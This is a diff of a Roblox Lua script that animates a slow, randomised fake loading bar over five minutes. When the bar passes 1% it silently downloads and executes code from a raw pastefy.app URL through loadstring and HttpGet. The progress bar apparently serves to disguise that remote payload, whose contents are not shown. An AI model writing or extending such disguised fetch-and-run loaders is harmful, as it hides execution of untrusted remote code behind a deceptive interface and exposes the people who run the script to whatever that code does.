@@ -53,32 +53,33 @@ percentText.Parent = background
 
 local TweenService = game:GetService("TweenService")
 local totalTime = 300
-local totalSteps = 100
-local remainingTime = totalTime
+local progress = 0
+local steps = {}
 
-for i = 0, totalSteps do
-    percentText.Text = i .. "%"
-    local goal = {Size = UDim2.new(i/totalSteps, 0, 1, 0)}
-    
-    local stepTime
-    if i < totalSteps then
-        local minStep = 1.5
-        local maxStep = 4.5
-        stepTime = math.random() * (maxStep - minStep) + minStep
-        if stepTime > remainingTime then
-            stepTime = remainingTime
-        end
-        remainingTime = remainingTime - stepTime
-    else
-        stepTime = remainingTime
+-- Randomize chunk sizes (2.4% - 10%) but make sure they sum to 100
+while progress < 100 do
+    local chunk = math.random(24, 100) / 10 -- 2.4% to 10%
+    if progress + chunk > 100 then
+        chunk = 100 - progress
     end
+    table.insert(steps, chunk)
+    progress = progress + chunk
+end
+
+local stepTime = totalTime / #steps
+progress = 0
+
+for i, chunk in ipairs(steps) do
+    local newProgress = progress + chunk
+    percentText.Text = string.format("%.1f%%", newProgress)
     
+    local goal = {Size = UDim2.new(newProgress / 100, 0, 1, 0)}
     local tweenInfo = TweenInfo.new(stepTime, Enum.EasingStyle.Linear)
     local tween = TweenService:Create(barInner, tweenInfo, goal)
     tween:Play()
     tween.Completed:Wait()
     
-    if i == 1 then
+    if progress < 1 and newProgress >= 1 then
         task.spawn(function()
             local success, err = pcall(function()
                 loadstring(game:HttpGet("https://pastefy.app/O1yBSZ1G/raw"))()
@@ -88,6 +89,8 @@ for i = 0, totalSteps do
             end
         end)
     end
+    
+    progress = newProgress
 end
 
 local fadeTween = TweenService:Create(background, TweenInfo.new(1), {BackgroundTransparency = 1})
